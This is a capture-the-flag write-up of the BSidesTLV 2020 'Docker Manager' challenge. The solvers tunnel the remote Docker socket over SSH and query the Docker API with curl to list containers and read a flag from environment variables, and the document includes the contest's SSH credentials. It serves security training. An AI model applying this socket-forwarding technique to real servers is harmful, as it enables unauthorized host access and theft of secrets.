# Docker Manager
* Category: Misc.
* 350 Points
* Solved by the JCTF Team

## Description
> At Last!
> 
> We got the SSH credentials, Can you hack it and send us the password?
> 
> URL: ssh://bsidestlv:d0ck3rm4n4g3r@docker-manager.ctf.bsidestlv.com:8000


## Solution

We connect to SSH server using `sshpass -p 'd0ck3rm4n4g3r' ssh bsidestlv@docker-manager.ctf.bsidestlv.com -p 8000` and immediate get the following screen:

![](images/docker.png)

In this screen we can try to enter a password, however we don't know what the correct password is.

We can't seem to kill this application or execute anything interesting within it.

At some point, the following hint was published by the organizers:

> SSH + Docker = :broken_heart:

Indeed! using SSH Tunneling we can expose the [Docker Deamon Socket](https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option) which allows using the Docker API.

We can create the tunnel by running the following command:
```
root@kali:/media/sf_CTFs/bsidestlv/Docker_Manager/docker# sshpass -p 'd0ck3rm4n4g3r' ssh -N -L localhost:9999:/var/run/docker.sock bsidestlv@docker-manager.ctf.bsidestlv.com -p 8000
```

This means that when we access our localhost at port 9999, the request will be tunneled to the remote host at port `/var/run/docker.sock`. 

Let's try this:
```console
root@kali:/media/sf_CTFs/bsidestlv/Docker_Manager/docker# curl -s http://localhost:9999/version | python -m json.tool
{
    "ApiVersion": "1.40",
    "Arch": "amd64",
    "BuildTime": "2020-03-11T01:29:16.000000000+00:00",
    "Components": [
        {
            "Details": {
                "ApiVersion": "1.40",
                "Arch": "amd64",
                "BuildTime": "2020-03-11T01:29:16.000000000+00:00",
                "Experimental": "false",
                "GitCommit": "afacb8b",
                "GoVersion": "go1.12.17",
                "KernelVersion": "4.19.104-microsoft-standard",
                "MinAPIVersion": "1.12",
                "Os": "linux"
            },
            "Name": "Engine",
            "Version": "19.03.8"
        },
        {
            "Details": {
                "GitCommit": "7ad184331fa3e55e52b890ea95e65ba581ae3429"
            },
            "Name": "containerd",
            "Version": "v1.2.13"
        },
        {
            "Details": {
                "GitCommit": "dc9208a3303feef5b3839f4323d9beb36df0a9dd"
            },
            "Name": "runc",
            "Version": "1.0.0-rc10"
        },
        {
            "Details": {
                "GitCommit": "fec3683"
            },
            "Name": "docker-init",
            "Version": "0.18.0"
        }
    ],
    "GitCommit": "afacb8b",
    "GoVersion": "go1.12.17",
    "KernelVersion": "4.19.104-microsoft-standard",
    "MinAPIVersion": "1.12",
    "Os": "linux",
    "Platform": {
        "Name": "Docker Engine - Community"
    },
    "Version": "19.03.8"
}
```

We have contact! Now, let's enumerate the containers:
```console
root@kali:/media/sf_CTFs/bsidestlv/Docker_Manager/docker# curl -s http://localhost:9999/containers/json | python -m json.tool
[
    {
        "Command": "docker-entrypoint.sh /usr/sbin/sshd -D",
        "Created": 1593249326,
        "HostConfig": {
            "NetworkMode": "docker-manager_default"
        },
        "Id": "ca3b76fc5a79dbfaffa9c11456d5ccecd43f03f37e8cfdb7becc27cc59ed3f1d",
        "Image": "docker-manager_challenge",
        "ImageID": "sha256:f2def1180f982e1c9955725a219ce8532d305ae6e01e66c9643f7dbe0c3ad8f7",
        "Labels": {
            "com.docker.compose.config-hash": "0345033b5a07fe9cd165abbf678cd54dbc8a05ae93d1f715eafab117973e436c",
            "com.docker.compose.container-number": "1",
            "com.docker.compose.oneoff": "False",
            "com.docker.compose.project": "docker-manager",
            "com.docker.compose.project.config_files": "docker-manager/docker-compose.yml",
            "com.docker.compose.project.working_dir": "/mnt/e/Projects/BSidesTLVCTF/ctf20/dockerfiles/docker-manager/api/docker-manager",
            "com.docker.compose.service": "challenge",
            "com.docker.compose.version": "1.25.5",
            "desktop.docker.io/wsl-distro": "Ubuntu-20.04"
        },
        "Mounts": [
            {
                "Destination": "/var/run/docker.sock",
                "Mode": "rw",
                "Propagation": "rprivate",
                "RW": true,
                "Source": "/run/desktop/mnt/host/wsl/docker-desktop-bind-mounts/Ubuntu-20.04/71329c4cc6e32171553fa81d044eb31d1a3aac52ba9376c4a99f4505c494cf5b",
                "Type": "bind"
            }
        ],
        "Names": [
            "/docker-manager_challenge_1"
        ],
        "NetworkSettings": {
            "Networks": {
                "docker-manager_default": {
                    "Aliases": null,
                    "DriverOpts": null,
                    "EndpointID": "d51f6464dfb631039c8a278f671cf68ae2615048f4f279d9ee1a761397871179",
                    "Gateway": "172.29.0.1",
                    "GlobalIPv6Address": "",
                    "GlobalIPv6PrefixLen": 0,
                    "IPAMConfig": null,
                    "IPAddress": "172.29.0.2",
                    "IPPrefixLen": 16,
                    "IPv6Gateway": "",
                    "Links": null,
                    "MacAddress": "02:42:ac:1d:00:02",
                    "NetworkID": "0f2a5ae4391f59b48cb8a5dd2344b2b304bea6a3497c8ab0fd0cbc3029616c4e"
                }
            }
        },
        "Ports": [
            {
                "IP": "0.0.0.0",
                "PrivatePort": 22,
                "PublicPort": 2222,
                "Type": "tcp"
            }
        ],
        "State": "running",
        "Status": "Up Less than a second"
    }
]
```

We have one container, let's view its details and search for the flag:
```console
root@kali:/media/sf_CTFs/bsidestlv/Docker_Manager/docker# curl -s http://localhost:9999/containers/ca3b76fc5a79dbfaffa9c11456d5ccecd43f03f37e8cfdb7becc27cc59ed3f1d/json | python3 -m json.tool | grep -i bsides
            "FLAG=BSidesTLV2020{SSH_F0RWARD1NG_F0R_FUN_4ND_PR0F1T}"
            "com.docker.compose.project.working_dir": "/mnt/e/Projects/BSidesTLVCTF/ctf20/dockerfiles/docker-manager/api/docker-manager",
```

The flag: `BSidesTLV2020{SSH_F0RWARD1NG_F0R_FUN_4ND_PR0F1T}`